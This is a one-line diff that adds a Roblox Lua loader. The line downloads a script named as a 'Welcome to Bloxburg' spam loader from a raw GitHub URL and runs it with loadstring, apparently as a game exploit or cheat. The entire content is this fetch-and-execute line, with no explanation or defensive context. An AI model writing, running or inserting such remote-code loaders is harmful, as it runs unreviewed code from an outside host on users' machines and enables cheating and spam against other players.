@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/welcome-to-bloxburg-spam3-k22b17piofgdef.lua"))()
